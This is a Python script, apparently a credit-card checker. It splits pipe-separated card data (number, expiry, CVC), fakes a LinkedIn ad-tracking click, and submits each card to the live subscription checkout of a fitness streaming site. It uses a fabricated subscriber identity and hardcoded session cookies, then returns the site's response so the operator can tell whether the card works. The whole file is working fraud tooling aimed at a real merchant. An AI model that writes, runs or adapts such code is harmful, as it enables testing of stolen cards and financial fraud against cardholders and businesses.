import requests

def Tele(ccx):
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#ebrahim
		yy = yy.split("20")[1]
	cookies = {
    'li_sugr': 'e09ffcb7-b77e-4097-b7ac-d3b5a1db1c0a',
    'bcookie': '"v=2&862e192b-3866-46d2-8415-c4ef3e14965a"',
    'UserMatchHistory': 'AQLctDxUPNE_6wAAAY98uueSoLTPW_HQPuR5IvAwWIYSgOnSB-4O89Ftg7SsyGV4yBJ-iDXWSixQwg',
    'AnalyticsSyncHistory': 'AQKKGyLgv60AJwAAAY98uueSRPeuYNwJ2aMGJAw6Bgz9LclQ_5TfDlmUCmKFKZ4FHZXllq541eUuEgSSHqdilQ',
    'lidc': '"b=TGST00:s=T:r=T:a=T:p=T:g=3401:u=1:x=1:i=1715784574:t=1715870974:v=2:sig=AQHaq3uhcwicl-hsUXVtbwyYvh9FXxTj"',
}

	headers = {
    'authority': 'px.ads.linkedin.com',
    'accept': '*',
    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
    'content-type': 'text/plain;charset=UTF-8',
    # 'cookie': 'li_sugr=e09ffcb7-b77e-4097-b7ac-d3b5a1db1c0a; bcookie="v=2&862e192b-3866-46d2-8415-c4ef3e14965a"; UserMatchHistory=AQLctDxUPNE_6wAAAY98uueSoLTPW_HQPuR5IvAwWIYSgOnSB-4O89Ftg7SsyGV4yBJ-iDXWSixQwg; AnalyticsSyncHistory=AQKKGyLgv60AJwAAAY98uueSRPeuYNwJ2aMGJAw6Bgz9LclQ_5TfDlmUCmKFKZ4FHZXllq541eUuEgSSHqdilQ; lidc="b=TGST00:s=T:r=T:a=T:p=T:g=3401:u=1:x=1:i=1715784574:t=1715870974:v=2:sig=AQHaq3uhcwicl-hsUXVtbwyYvh9FXxTj"',
    'origin': 'https://www.lagreeod.com',
    'referer': 'https://www.lagreeod.com/',
    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Linux"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'cross-site',
    'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
}

	data = '{"pids":[5143044],"scriptVersion":148,"time":1715794001783,"domain":"lagreeod.com","url":"https://lagreeod.com/subscribe","pageTitle":"Subcribe to Lagree Fitness On Demand | Virtual Lagree Fitness Classes - Lagree On Demand","websiteSignalRequestId":"9ad0a468-ef64-bb42-29d0-f2bcf7b665ec","isTranslated":false,"liFatId":"","liGiant":"","misc":{"psbState":-4},"isLinkedInApp":false,"hem":null,"signalType":"CLICK","href":"","domAttributes":{"elementSemanticType":null,"elementValue":null,"elementType":"submit","tagName":"BUTTON","backgroundImageSrc":null,"imageSrc":null,"imageAlt":null,"innerText":"START YOUR SUBSCRIPTION","elementTitle":null,"cursor":"pointer","formAction":"register/validate_subscribe","isFormSubmission":true},"innerElements":null,"elementCrumbsTree":[{"tagName":"main","nthChild":5,"id":"site-root"},{"tagName":"section","nthChild":0,"classes":["mbsec","pb-05","pt-0","px-2"]},{"tagName":"div","nthChild":0,"classes":["container1080","mb-05"]},{"tagName":"form","nthChild":1,"id":"register_subscribe","classes":["flex","nowrap","row"],"attributes":{"action":"register/validate_subscribe","data-gtm-form-interact-id":"0"}},{"tagName":"div","nthChild":2,"classes":["col","mb-mob-3","order-mob-1","pl-4","pr-0","px-mob-1","w100"]},{"tagName":"div","nthChild":0,"classes":["border","for--loading","panel","subsc-right"]},{"tagName":"div","nthChild":12,"classes":["row","w100"]},{"tagName":"div","nthChild":0,"classes":["aic","col-12","flex","jcc","px-0"]},{"tagName":"button","nthChild":0,"classes":["black-bg","btn","btn-tall","btn-wide","f-14","w100","white"]}],"isFilteredByClient":false}'

	response = requests.post('https://px.ads.linkedin.com/wa/', cookies=cookies, headers=headers, data=data)

	cookies = {
    '_ga': 'GA1.1.777105074.1711957370',
    '_gcl_au': '1.1.886741420.1711957370',
    'optiMonkClientId': '42b3177f-139d-a2f9-d22b-99dc134be88f',
    'ci_session': '3lovhsmars6p9kd19hv8pda77gt7udig',
    '_ga_4HXMJ7D3T6': 'GS1.1.1715793791.22.1.1715793969.0.0.0',
    '_ga_KQ5ZJRZGQR': 'GS1.1.1715793791.23.1.1715793969.0.0.0',
}

	headers = {
    'authority': 'www.lagreeod.com',
    'accept': 'application/json, text/javascript, */*; q=0.01',
    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    # 'cookie': '_ga=GA1.1.777105074.1711957370; _gcl_au=1.1.886741420.1711957370; optiMonkClientId=42b3177f-139d-a2f9-d22b-99dc134be88f; ci_session=3lovhsmars6p9kd19hv8pda77gt7udig; _ga_4HXMJ7D3T6=GS1.1.1715793791.22.1.1715793969.0.0.0; _ga_KQ5ZJRZGQR=GS1.1.1715793791.23.1.1715793969.0.0.0',
    'origin': 'https://www.lagreeod.com',
    'referer': 'https://www.lagreeod.com/subscribe',
    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Linux"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'x-requested-with': 'XMLHttpRequest',
}

	data = {
    'stripe_customer': '',
    'subscription_type': 'Weekly Subscription',
    'firstname': 'Angel',
    'lastname': 'Rippin',
    'email': 'gvvvv7277@gmail.com',
    'password': '20056677',
    'card[name]': 'Angel Rippin',
    'card[number]': n,
    'card[exp_month]': mm,
    'card[exp_year]': yy,
    'card[cvc]': cvc,
    'coupon': '',
    's1': '18',
    'sum': '37',
}

	response = requests.post('https://www.lagreeod.com/register/validate_subscribe', cookies=cookies, headers=headers, data=data)
	
	try:
		ii=(response.text)
	except:
		return 'error'
	return ii
	